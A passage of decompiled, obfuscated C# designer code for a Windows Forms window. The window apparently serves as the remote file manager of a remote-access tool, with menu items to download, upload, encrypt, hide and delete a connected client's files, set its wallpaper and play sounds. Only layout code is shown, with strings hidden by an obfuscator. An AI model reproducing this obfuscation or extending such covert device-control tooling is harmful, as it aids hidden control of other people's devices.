            this.Panel6.Controls.Add((Control) this.CountText);
            this.Panel6.Dock = DockStyle.Bottom;
            this.Panel6.Location = new Point(0, 774);
            num1 = (int) num2 * -888065110 ^ 1241149588;
            continue;
          case 324:
            this.Downpic.Name = EXGuarder.\u00348555905;
            num1 = (int) num2 * -303480018 ^ -569721564;
            continue;
          case 325:
            this.thumb_chk.Style = UIStyle.Custom;
            this.thumb_chk.StyleCustomMode = true;
            this.thumb_chk.TabIndex = 35;
            num1 = (int) num2 * -1719898966 ^ 1801088940;
            continue;
          case 326:
            this.Selecttext.Font = new Font(EXGuarder.\u0036F401941, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1784472630 ^ -121828342;
            continue;
          case 327:
            this.ThumbsCont.TabIndex = 8;
            num1 = (int) num2 * -1909672568 ^ -1896123379;
            continue;
          case 328:
            this.DrakeUIButtonIcon6.Location = new Point(121, 0);
            this.DrakeUIButtonIcon6.Name = EXGuarder.\u003555C3131;
            num1 = (int) num2 * 513024863 ^ 64212149;
            continue;
          case 329:
            this.DrakeUIButtonIcon6.Dock = DockStyle.Right;
            num1 = (int) num2 * 669862022 ^ -235466920;
            continue;
          case 330:
            this.searchtext.Minimum = (double) int.MinValue;
            num1 = (int) num2 * -1419929738 ^ 490514137;
            continue;
          case 331:
            this.FolderDownloadsToolStripMenuItem.Size = new Size(169, 24);
            this.FolderDownloadsToolStripMenuItem.Text = EXGuarder.\u0036B0B1D1A;
            num1 = (int) num2 * -1417174019 ^ -743855776;
            continue;
          case 332:
            this.dcmbtn.RectHoverColor = Color.White;
            this.dcmbtn.RectPressColor = Color.White;
            num1 = (int) num2 * 1306374336 ^ 1593187920;
            continue;
          case 333:
            this.sdbtn.RectPressColor = Color.White;
            this.sdbtn.RectSelectedColor = Color.White;
            this.sdbtn.Size = new Size(161, 26);
            this.sdbtn.Style = UIStyle.Custom;
            num1 = (int) num2 * -1973198773 ^ 2101297232;
            continue;
          case 334:
            this.ZipToolStripMenuItem.Size = new Size(169, 24);
            this.ZipToolStripMenuItem.Text = EXGuarder.\u0033F33141C;
            num1 = (int) num2 * 357860511 ^ -292696896;
            continue;
          case 335:
            this.Label1.Font = new Font(EXGuarder.\u0036F401941, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -341505175 ^ 2018404226;
            continue;
          case 336:
            this.UploadToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 1081666442 ^ -1849175037;
            continue;
          case 337:
            this.EditToolStripMenuItem.Text = EXGuarder.\u00365717962;
            this.HideToolStripMenuItem.Name = EXGuarder.\u0032630752A;
            this.HideToolStripMenuItem.Size = new Size(169, 24);
            num1 = (int) num2 * -1144852797 ^ 2072241437;
            continue;
          case 338:
            this.BackColor = Color.Black;
            this.ClientSize = new Size(1016, 850);
            this.Controls.Add((Control) this.Panel1);
            this.Controls.Add((Control) this.Panel2);
            num1 = (int) num2 * 1923468035 ^ 1222455399;
            continue;
          case 339:
            this.searchtext.Radius = 15;
            this.searchtext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.searchtext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 437966033 ^ 309599013;
            continue;
          case 340:
            gridViewCellStyle7 = new DataGridViewCellStyle();
            num1 = (int) num2 * 1590455965 ^ 1207116625;
            continue;
          case 341:
            this.CutToolStripMenuItem.Size = new Size(169, 24);
            num1 = (int) num2 * -11885096 ^ 1834156751;
            continue;
          case 342:
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * -1067966649 ^ -884194592;
            continue;
          case 343:
            this.DGV0.ReadOnly = true;
            this.DGV0.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DGV0.RowHeadersVisible = false;
            gridViewCellStyle4.BackColor = Color.Black;
            num1 = (int) num2 * -1800138867 ^ -1057369636;
            continue;
          case 344:
            this.dcmbtn.Symbol = 61502;
            num1 = (int) num2 * -385776670 ^ -1974834785;
            continue;
          case 345:
            this.sdbtn.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -315542453 ^ 1166045979;
            continue;
          case 346:
            this.S.HeaderText = EXGuarder.\u00342492D2D;
            this.S.Name = EXGuarder.\u00366252B0E;
            this.D.HeaderText = EXGuarder.\u0031D251C0F;
            num1 = (int) num2 * 1336524273 ^ 50019751;
            continue;
          case 347:
            this.D.Name = EXGuarder.\u0036E6E2415;
            this.ST.HeaderText = EXGuarder.\u0035A044B6A;
            this.ST.Name = EXGuarder.\u0031B28386D;
            this.Panel6.BackColor = Color.Black;
            num1 = (int) num2 * 1490814635 ^ 104583069;
            continue;
          case 348:
            this.DrakeWidth_W3.TabIndex = 31;
            this.DrakeWidth_W2.BackColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeWidth_W2.Location = new Point(39, 171);
            num1 = (int) num2 * 1248606990 ^ -947483033;
            continue;
          case 349:
            this.CutToolStripMenuItem.Name = EXGuarder.\u0034655406F;
            this.CutToolStripMenuItem.ShortcutKeys = Keys.X | Keys.Control;
            num1 = (int) num2 * 241692732 ^ 639007345;
            continue;
          case 350:
            this.CutToolStripMenuItem = new ToolStripMenuItem();
            this.PasteToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -1155111178 ^ 1016925372;
            continue;
          case 351:
            this.Panel2.SuspendLayout();
            num1 = (int) num2 * 38741903 ^ -783141071;
            continue;
          case 352:
            this.DrakeUIButtonIcon5.RectHoverColor = Color.Transparent;
            num1 = (int) num2 * -1919687550 ^ 655534769;
            continue;
          case 353:
            this.PB.TabIndex = 5;
            this.Timer2.Interval = 1000;
            this.AutoScaleDimensions = new SizeF(7f, 17f);
            num1 = (int) num2 * -469764959 ^ -744984896;
            continue;
          case 354:
            this.Panel3.PerformLayout();
            num1 = (int) num2 * 439644076 ^ 2050115958;
            continue;
          case 355:
            this.PasteToolStripMenuItem.ShortcutKeys = Keys.V | Keys.Control;
            num1 = (int) num2 * -1341158735 ^ 535033862;
            continue;
          case 356:
            this.DrakeUIButtonIcon7.SymbolSize = 29;
            num1 = (int) num2 * -765396560 ^ 714525491;
            continue;
          case 357:
            this.DrakeUIButtonIcon6.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1876841117 ^ -395757665;
            continue;
          case 358:
            this.HideToolStripMenuItem.Text = EXGuarder.\u0035B6B616B;
            this.ShowToolStripMenuItem.Name = EXGuarder.\u003624A2229;
            this.ShowToolStripMenuItem.Size = new Size(169, 24);
            num1 = (int) num2 * -1265664516 ^ -551658697;
            continue;
          case 359:
            this.Panel4.TabIndex = 21;
            num1 = (int) num2 * 1214675837 ^ -1430038010;
            continue;
          case 360:
            goto label_1;
          case 361:
            gridViewCellStyle7.ForeColor = Color.White;
            gridViewCellStyle7.SelectionBackColor = Color.FromArgb(35, 35, 35);
            num1 = (int) num2 * -1390888641 ^ 894992853;
            continue;
          case 362:
            this.ThumbsCont.BackColor = Color.Transparent;
            num1 = (int) num2 * -804026744 ^ -69121534;
            continue;
          case 363:
            this.DrakeUIButtonIcon6.Font = new Font(EXGuarder.\u0036F401941, 12f);
            this.DrakeUIButtonIcon6.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -81037045 ^ -1232365782;
            continue;
          case 364:
            this.pathtxt.Cursor = Cursors.No;
            num1 = (int) num2 * -1511083715 ^ -2093361291;
            continue;
          case 365:
            this.CountText.Name = EXGuarder.\u00341206327;
            this.CountText.Size = new Size(141, 25);
            num1 = (int) num2 * 1590441455 ^ 1516552001;
            continue;
          case 366:
            this.dcmbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.dcmbtn.FillPressColor = Color.Black;
            num1 = (int) num2 * 1465647090 ^ 1299321683;
            continue;
          case 367:
            this.searchtext.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * -1921758324 ^ -1546203121;
            continue;
          case 368:
            this.thumb_chk.Location = new Point(16, 186);
            num1 = (int) num2 * -1426569111 ^ -166540857;
            continue;
          case 369:
            this.picbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 140164543 ^ 2127249579;
            continue;
          case 370:
            this.Timer2 = new Timer(this.components);
            this.ctxMenu.SuspendLayout();
            num1 = (int) num2 * 618607 ^ -1559621793;
            continue;
          case 371:
            this.Panel1 = new Panel();
            num1 = (int) num2 * 1874196492 ^ -2013442572;
            continue;
          case 372:
            this.dcmbtn.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.dcmbtn.Location = new Point(9, 93);
            num1 = (int) num2 * -1094657066 ^ -893990893;
            continue;
          case 373:
            this.pathtxt.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.pathtxt.RectDisableColor = Color.Black;
            this.pathtxt.Size = new Size(438, 26);
            num1 = (int) num2 * 1052308807 ^ -1518148415;
            continue;
          case 374:
            this.FilesUpload = new OpenFileDialog();
            num1 = (int) num2 * 2085136506 ^ -133235897;
            continue;
          case 375:
            this.cancelbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1216232369 ^ -1121655949;
            continue;
          case 376:
            this.DrakeWidth_W4 = new DrakeWidth_W();
            this.DrakeWidth_W3 = new DrakeWidth_W();
            this.DrakeWidth_W2 = new DrakeWidth_W();
            num1 = (int) num2 * 357278052 ^ -1177205551;
            continue;
          case 377:
            this.DrakeUIButtonIcon6.RectSelectedColor = Color.Transparent;
            this.DrakeUIButtonIcon6.Size = new Size(58, 41);
            num1 = (int) num2 * -619108424 ^ 1699750892;
            continue;
          case 378:
            gridViewCellStyle6 = new DataGridViewCellStyle();
            num1 = (int) num2 * 1432330759 ^ 651012618;
            continue;
          case 379:
            this.Downpic.RectSelectedColor = Color.White;
            num1 = (int) num2 * -484168908 ^ 814235132;
            continue;
          case 380:
            this.searchtext.Size = new Size(222, 26);
            num1 = (int) num2 * -417208636 ^ -2052345743;
            continue;
          case 381:
            this.DGVDATA.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            num1 = (int) num2 * -918100428 ^ -337180325;
            continue;
          case 382:
            this.ThumbsCont.Font = new Font(EXGuarder.\u0036F401941, 9f);
            num1 = (int) num2 * -293586926 ^ -378691725;
            continue;
          case 383:
            this.clearsrchbtn.Margin = new Padding(4);
            this.clearsrchbtn.Name = EXGuarder.\u0032D054F26;
            this.clearsrchbtn.Size = new Size(27, 26);
            this.clearsrchbtn.Style = UIStyle.Custom;
            this.clearsrchbtn.StyleCustomMode = true;
            num1 = (int) num2 * -1488676278 ^ 451220969;
            continue;
          case 384:
            this.cancelbtn.RectHoverColor = Color.White;
            this.cancelbtn.RectPressColor = Color.White;
            this.cancelbtn.RectSelectedColor = Color.White;
            num1 = (int) num2 * -771040438 ^ -1898220270;
            continue;
          case 385:
            this.viwimage.Location = new Point(0, 430);
            num1 = (int) num2 * 2080359827 ^ -565947896;
            continue;
          case 386:
            this.DrakeUIButtonIcon6.FillColor = Color.Black;
            num1 = (int) num2 * -439337349 ^ 1652172574;
            continue;
          case 387:
            this.DGVDATA.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            this.DGVDATA.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            num1 = (int) num2 * 1123684963 ^ 887422302;
            continue;
          case 388:
            this.DGV0.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            num1 = (int) num2 * 100526417 ^ 1961649468;
            continue;
          case 389:
            this.CutToolStripMenuItem.Text = EXGuarder.\u0036367650F;
            num1 = (int) num2 * -440736384 ^ 1249996313;
            continue;
          case 390:
            this.DrakeWidth_W3.Location = new Point(39, 222);
            this.DrakeWidth_W3.Name = EXGuarder.\u0033136675B;
            num1 = (int) num2 * -1402435170 ^ 926405917;
            continue;
          case 391:
            this.Panel2.Controls.Add((Control) this.clearsrchbtn);
            num1 = (int) num2 * 803857260 ^ 2080495589;
            continue;
          case 392:
            gridViewCellStyle4 = new DataGridViewCellStyle();
            num1 = (int) num2 * -590934738 ^ 1328898044;
            continue;
          case 393:
            gridViewCellStyle6.ForeColor = Color.White;
            num1 = (int) num2 * -15275831 ^ -65284626;
            continue;
          case 394:
            this.ThumbsCont.Name = EXGuarder.\u0031228672C;
            num1 = (int) num2 * -1950408093 ^ 556695832;
            continue;
          case 395:
            this.dcmbtn.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.dcmbtn.Font = new Font(EXGuarder.\u0036F401941, 12f);
            num1 = (int) num2 * -688268451 ^ 1608431067;
            continue;
          case 396:
            this.DrakeUIButtonIcon4.Cursor = Cursors.Hand;
            this.DrakeUIButtonIcon4.FillColor = Color.Black;
            this.DrakeUIButtonIcon4.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.DrakeUIButtonIcon4.FillPressColor = Color.Black;
            num1 = (int) num2 * 350098606 ^ -1322888279;
            continue;
          case 397:
            this.FilesUpload.FileName = EXGuarder.\u0032A2B363A;
            num1 = (int) num2 * 1732559310 ^ -370171325;
            continue;
          case 398:
            this.sdbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.sdbtn.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1219487750 ^ -1448200200;
            continue;
          case 399:
            this.clearsrchbtn.TabIndex = 36;
            this.clearsrchbtn.Visible = false;
            num1 = (int) num2 * -588822570 ^ -1185822385;
            continue;
          case 400:
            this.DGVDATA.RowHeadersDefaultCellStyle = gridViewCellStyle2;
            num1 = (int) num2 * 351234658 ^ 2084642803;
            continue;
          case 401:
            this.clearsrchbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.clearsrchbtn.Location = new Point(534, 9);
            num1 = (int) num2 * 171607260 ^ 1576982251;
            continue;
          case 402:
            this.DGV0.ContextMenuStrip = this.ctxMenu;
            gridViewCellStyle6.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle6.BackColor = Color.FromArgb(45, 45, 45);
            gridViewCellStyle6.Font = new Font(EXGuarder.\u0036F401941, 12f);
            num1 = (int) num2 * -1453904426 ^ -1883642987;
            continue;
          case 403:
            this.DrakeWidth_W1.Location = new Point(10, 45);
            this.DrakeWidth_W1.Name = EXGuarder.\u0031838190C;
            this.DrakeWidth_W1.Size = new Size(800, 1);
            this.DrakeWidth_W1.TabIndex = 23;
            this.PB.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            this.PB.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -301509187 ^ 940498137;
            continue;
          case 404:
            this.DrakeUIButtonIcon7.FillColor = Color.Black;
            num1 = (int) num2 * 1838608508 ^ 1380461279;
            continue;
          case 405:
            this.Panel4.Size = new Size(179, 41);
            num1 = (int) num2 * -2108187531 ^ -497044686;
            continue;
          case 406:
            this.Panel2 = new Panel();
            num1 = (int) num2 * -1211634635 ^ 1261932981;
            continue;
          case 407:
            this.searchbtn.Style = UIStyle.Custom;
            this.searchbtn.StyleCustomMode = true;
            num1 = (int) num2 * 1156196271 ^ -1886590244;
            continue;
          case 408:
            this.DrakeUIButtonIcon8.Style = UIStyle.Custom;
            num1 = (int) num2 * -1514165555 ^ 1352112115;
            continue;
          case 409:
            this.DGVDATA.CellBorderStyle = DataGridViewCellBorderStyle.None;
            this.DGVDATA.ClipboardCopyMode = DataGridViewClipboardCopyMode.EnableWithoutHeaderText;
            num1 = (int) num2 * 331792498 ^ -1408384905;
            continue;
          case 410:
            this.Label1.TabIndex = 3;
            num1 = (int) num2 * 1133007818 ^ 1536258572;
            continue;
          case 411:
            this.pathtxt = new DrakeUITextBox();
            num1 = (int) num2 * -1604051146 ^ 350865881;
            continue;
          case 412:
            this.Panel1.Controls.Add((Control) this.DGV0);
            num1 = (int) num2 * -1452406058 ^ 1187313888;
            continue;
          case 413:
            this.DGVDATA.RowsDefaultCellStyle = gridViewCellStyle3;
            num1 = (int) num2 * -910959379 ^ -2105938456;
            continue;
          case 414:
            gridViewCellStyle2.BackColor = Color.FromArgb(35, 35, 35);
            gridViewCellStyle2.Font = new Font(EXGuarder.\u0036F401941, 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -905215804 ^ -1281075574;
            continue;
          case 415:
            this.Panel3.Controls.Add((Control) this.ClientPic);
            num1 = (int) num2 * 1083950717 ^ -364906265;
            continue;
          case 416:
            ((ISupportInitialize) this.DGV0).EndInit();
            ((ISupportInitialize) this.DGVDATA).EndInit();
            num1 = (int) num2 * 904223693 ^ 1732287992;
            continue;
          case 417:
            this.DGV0.ColumnHeadersHeight = 32;
            num1 = (int) num2 * -288607034 ^ 807880817;
            continue;
          case 418:
            this.EncryptToolStripMenuItem.Name = EXGuarder.\u00348325B66;
            this.EncryptToolStripMenuItem.Size = new Size(169, 24);
            num1 = (int) num2 * -1982278621 ^ 1810638943;
            continue;
          case 419:
            this.searchtext.Style = UIStyle.Custom;
            num1 = (int) num2 * -2087308119 ^ -895057096;
            continue;
          case 420:
            this.Downloadnum.Size = new Size(25, 29);
            num1 = (int) num2 * 909168545 ^ -1078285537;
            continue;
          case 421:
            this.DrakeUIButtonIcon8.RectSelectedColor = Color.Transparent;
            num1 = (int) num2 * 6306672 ^ 622470666;
            continue;
          case 422:
            this.viwimage.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 1448291737 ^ -281235729;
            continue;
          case 423:
            this.typ.Name = EXGuarder.\u00378143F39;
            num1 = (int) num2 * -596620875 ^ 905172291;
            continue;
          case 424:
            this.DrakeUIButtonIcon7.Style = UIStyle.Custom;
            this.DrakeUIButtonIcon7.Symbol = 61470;
            num1 = (int) num2 * 1740009903 ^ 1746937844;
            continue;
          case 425:
            this.usrscreen.Size = new Size(33, 33);
            this.usrscreen.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num2 * -1600368847 ^ -862054025;
            continue;
          case 426:
            gridViewCellStyle3.Font = new Font(EXGuarder.\u0033B664519, 10f);
            num1 = (int) num2 * -560418103 ^ -1677725369;
            continue;
          case 427:
            this.DownloadToolStripMenuItem.Text = EXGuarder.\u00348353A66;
            this.UploadToolStripMenuItem.Name = EXGuarder.\u0037517584B;
            num1 = (int) num2 * -2084680664 ^ -67504786;
            continue;
          case 428:
            this.cancelbtn.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.cancelbtn.Font = new Font(EXGuarder.\u0036F401941, 12f);
            this.cancelbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -198288092 ^ 920996531;
            continue;
          case 429:
            this.dcmbtn.TabIndex = 25;
            num1 = (int) num2 * 401738661 ^ -1568054544;
            continue;
          case 430:
            this.sdbtn.Name = EXGuarder.\u0037403642B;
            this.sdbtn.Radius = 25;
            this.sdbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.sdbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -261428108 ^ 1234466731;
            continue;
          case 431:
            this.N = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 1889345939 ^ -1927641687;
            continue;
          case 432:
            this.Panel3.Controls.Add((Control) this.picbtn);
            num1 = (int) num2 * -1754475933 ^ 690897245;
            continue;
          case 433:
            this.dcmbtn.Cursor = Cursors.Hand;
            num1 = (int) num2 * -879522905 ^ -577575265;
            continue;
          case 434:
            this.cancelbtn.Size = new Size(163, 26);
            this.cancelbtn.Style = UIStyle.Custom;
            num1 = (int) num2 * 938755936 ^ -1407404133;
            continue;
          case 435:
            this.Downpic.Text = EXGuarder.\u0036B0B1D1A;
            num1 = (int) num2 * -1010534061 ^ 293512427;
            continue;
          case 436:
            this.ClientPic.Location = new Point(34, 8);
            num1 = (int) num2 * 1359417591 ^ 306902933;
            continue;
          case 437:
            this.sdbtn.FillPressColor = Color.Black;
            num1 = (int) num2 * -1701566002 ^ -2048256007;
            continue;
          case 438:
            this.ctxMenu.Items.AddRange(new ToolStripItem[19]
            {
              (ToolStripItem) this.OpenToolStripMenuItem,
              (ToolStripItem) this.CopyToolStripMenuItem,
              (ToolStripItem) this.CutToolStripMenuItem,
              (ToolStripItem) this.PasteToolStripMenuItem,
              (ToolStripItem) this.DownloadToolStripMenuItem,
              (ToolStripItem) this.UploadToolStripMenuItem,
              (ToolStripItem) this.EncryptToolStripMenuItem,
              (ToolStripItem) this.DecodeToolStripMenuItem,
              (ToolStripItem) this.ZipToolStripMenuItem,
              (ToolStripItem) this.UnZipToolStripMenuItem,
              (ToolStripItem) this.DeleteToolStripMenuItem,
              (ToolStripItem) this.AddFilesToolStripMenuItem,
              (ToolStripItem) this.RenameToolStripMenuItem,
              (ToolStripItem) this.EditToolStripMenuItem,
              (ToolStripItem) this.HideToolStripMenuItem,
              (ToolStripItem) this.ShowToolStripMenuItem,
              (ToolStripItem) this.SetWallpaperToolStripMenuItem,
              (ToolStripItem) this.PlaySoundToolStripMenuItem,
              (ToolStripItem) this.FolderDownloadsToolStripMenuItem
            });
            num1 = (int) num2 * -1240360011 ^ 253516998;
            continue;
          case 439:
            this.Text = EXGuarder.\u00341580413;
            num1 = (int) num2 * 981970415 ^ 1068609494;
            continue;
          case 440:
            this.CopyToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -1269499614 ^ -327322130;
            continue;
          case 441:
            this.Downpic.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1441848183 ^ -1043618800;
            continue;
          case 442:
            this.Panel1.Name = EXGuarder.\u0030A0F3E3E;
            this.Panel1.Size = new Size(837, 799);
            this.Panel1.TabIndex = 0;
            num1 = (int) num2 * -983583453 ^ 1908708266;
            continue;
          case 443:
            this.seentext.Text = EXGuarder.\u0031E77143F;
            num1 = (int) num2 * 487335215 ^ -558148676;
            continue;
          case 444:
            this.Panel4 = new Panel();
            num1 = (int) num2 * 2134107268 ^ 146163419;
            continue;
          case 445:
            this.DrakeUIButtonIcon7.Dock = DockStyle.Fill;
            num1 = (int) num2 * -1556284286 ^ 1482884130;
            continue;
          case 446:
            this.DrakeUIButtonIcon8.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1230998034 ^ 1265960863;
            continue;
          case 447:
            this.mofdat.Name = EXGuarder.\u00308790F49;
            num1 = (int) num2 * 1569914930 ^ -1645218311;
            continue;
          case 448:
            this.Label1.FlatStyle = FlatStyle.System;
            num1 = (int) num2 * 1709139389 ^ -234094441;
            continue;
          case 449:
            this.Panel2.Controls.Add((Control) this.searchtext);
            this.Panel2.Controls.Add((Control) this.searchbtn);
            this.Panel2.Controls.Add((Control) this.clinumb);
            this.Panel2.Controls.Add((Control) this.DrakeUIButtonIcon5);
            num1 = (int) num2 * -1917932635 ^ 513645309;
            continue;
          case 450:
            this.S = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -1070479735 ^ -1272368380;
            continue;
          case 451:
            this.DrakeUIButtonIcon4.RectSelectedColor = Color.Transparent;
            num1 = (int) num2 * -62744254 ^ 1737157412;
            continue;
          case 452:
            this.DGVDATA.Margin = new Padding(3, 4, 3, 4);
            this.DGVDATA.Name = EXGuarder.\u0035B4F2557;
            this.DGVDATA.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
            num1 = (int) num2 * 2047489323 ^ 1853930010;
            continue;
          case 453:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num2 * 1187764984 ^ -708655210;
            continue;
          case 454:
            this.Panel1.Margin = new Padding(3, 4, 3, 4);
            num1 = (int) num2 * 235242460 ^ 1564855648;
            continue;
          case 455:
            gridViewCellStyle8.SelectionBackColor = SystemColors.Highlight;
            num1 = (int) num2 * -1234236625 ^ 1117318193;
            continue;
          case 456:
            this.clearsrchbtn.FillColor = Color.Black;
            this.clearsrchbtn.Font = new Font(EXGuarder.\u0036F401941, 12f);
            num1 = (int) num2 * 1381257318 ^ -574231773;
            continue;
          case 457:
            this.usrscreen = new PictureBox();
            this.Usrbtry = new PictureBox();
            num1 = (int) num2 * 1244973154 ^ 802372673;
            continue;
          case 458:
            this.nam.HeaderText = EXGuarder.\u0033101340F;
            this.nam.Name = EXGuarder.\u003403A744B;
            this.nam.ReadOnly = true;
            num1 = (int) num2 * 1073355028 ^ 1049236534;
            continue;
          case 459:
            this.ClearButton.RectSelectedColor = Color.White;
            num1 = (int) num2 * -1143533082 ^ 404427000;
            continue;
          case 460:
            this.Panel6.Name = EXGuarder.\u0034A355622;
            num1 = (int) num2 * 1811301965 ^ 2111162275;
            continue;
          case 461:
            this.DrakeUIButtonIcon7.Name = EXGuarder.\u0030E393C44;
            this.DrakeUIButtonIcon7.Radius = 0;
            num1 = (int) num2 * -648740411 ^ 309784077;
            continue;
          case 462:
            this.Panel2.Controls.Add((Control) this.DrakeUIButtonIcon4);
            num1 = (int) num2 * -578217995 ^ -1781860231;
            continue;
          case 463:
            this.Panel6.TabIndex = 10;
            num1 = (int) num2 * -1407833709 ^ 628282096;
            continue;
          case 464:
            this.searchbtn.FillColor = Color.Black;
            num1 = (int) num2 * -46605429 ^ -1900851501;
            continue;
          case 465:
            this.Selecttext.TabIndex = 1;
            num1 = (int) num2 * 1395457294 ^ 1739141749;
            continue;
          case 466:
            this.DrakeUIButtonIcon6.RectHoverColor = Color.Transparent;
            num1 = (int) num2 * 1519808540 ^ -685178076;
            continue;
          case 467:
            this.siz.HeaderText = EXGuarder.\u00342492D2D;
            this.siz.Name = EXGuarder.\u00378427543;
            this.siz.ReadOnly = true;
            this.mofdat.FillWeight = 60f;
            num1 = (int) num2 * -1461930046 ^ -2130806978;
            continue;
          case 468:
            this.DGV0 = new DrakeUIDataGridView();
            num1 = (int) num2 * 349749518 ^ -28513079;
            continue;
          case 469:
            this.cancelbtn.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.cancelbtn.Location = new Point(10, 319);
            num1 = (int) num2 * 1996655853 ^ 1696250317;
            continue;
          case 470:
            this.usrscreen.TabIndex = 14;
            num1 = (int) num2 * 2015340156 ^ 501564133;
            continue;
          case 471:
            this.CountText = new Label();
            num1 = (int) num2 * -1817445598 ^ 1796848871;
            continue;
          case 472:
            this.Downpic.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1284928924 ^ 2071746139;
            continue;
          case 473:
            this.EncryptToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 1144621504 ^ 375628934;
            continue;
          case 474:
            this.picbtn.Radius = 25;
            num1 = (int) num2 * -867051054 ^ -729272500;
            continue;
          case 475:
            this.PasteToolStripMenuItem.Text = EXGuarder.\u00361541549;
            num1 = (int) num2 * 930991177 ^ 49566229;
            continue;
          case 476:
            this.Downpic.TabIndex = 36;
            this.Downpic.Tag = (object) EXGuarder.\u00308301862;
            num1 = (int) num2 * -1974274774 ^ 840170957;
            continue;
          case 477:
            this.searchbtn.Font = new Font(EXGuarder.\u0036F401941, 12f);
            this.searchbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 714736653 ^ -1660466950;
            continue;
          case 478:
            gridViewCellStyle2.WrapMode = DataGridViewTriState.True;
            num1 = (int) num2 * -1940162154 ^ 683984220;
            continue;
          case 479:
            this.DrakeUIButtonIcon6.RectDisableColor = Color.Transparent;
            num1 = (int) num2 * -1811229617 ^ 2067691657;
            continue;
          case 480:
            this.DGV0.Location = new Point(0, 0);
            num1 = (int) num2 * 344249786 ^ 8705001;
            continue;
          case 481:
            this.ClearButton.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.ClearButton.FillPressColor = Color.Black;
            num1 = (int) num2 * 2136859149 ^ -1058036460;
            continue;
          case 482:
            this.UnZipToolStripMenuItem.Name = EXGuarder.\u003512A414D;
            this.UnZipToolStripMenuItem.Size = new Size(169, 24);
            num1 = (int) num2 * 1695994854 ^ -880926461;
            continue;
          case 483:
            this.Panel3.Controls.Add((Control) this.DrakeWidth_W2);
            num1 = (int) num2 * -1961990024 ^ -968524443;
            continue;
          case 484:
            this.DrakeWidth_W4.Size = new Size(100, 1);
            this.DrakeWidth_W4.TabIndex = 32;
            num1 = (int) num2 * 369669603 ^ -1782673442;
            continue;
          case 485:
            this.picbtn.Name = EXGuarder.\u0035343025E;
            num1 = (int) num2 * 353663304 ^ -1820169524;
            continue;
          case 486:
            this.Downloadnum.Font = new Font(EXGuarder.\u0036F401941, 14f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            this.Downloadnum.Location = new Point(81, 231);
            num1 = (int) num2 * -145297621 ^ 1275736891;
            continue;
          case 487:
            this.Downpic.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -1511869229 ^ -305824612;
            continue;
          case 488:
            this.dcmbtn.FillColor = Color.Black;
            num1 = (int) num2 * -215215557 ^ 1793162878;
            continue;
          case 489:
            this.Selecttext.Text = EXGuarder.\u0030E05733B;
            num1 = (int) num2 * 1806140345 ^ 151911511;
            continue;
          default:
            goto label_491;
        }
      }
label_491:
      this.ResumeLayout(false);
    }

    internal virtual ContextMenuStrip ctxMenu
    {
      get => this._ctxMenu;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        CancelEventHandler cancelEventHandler = new CancelEventHandler(this.ctxMenu_Opening);
label_1:
        int num1 = 323297528;
        ContextMenuStrip ctxMenu;
        while (true)
        {
          uint num2;
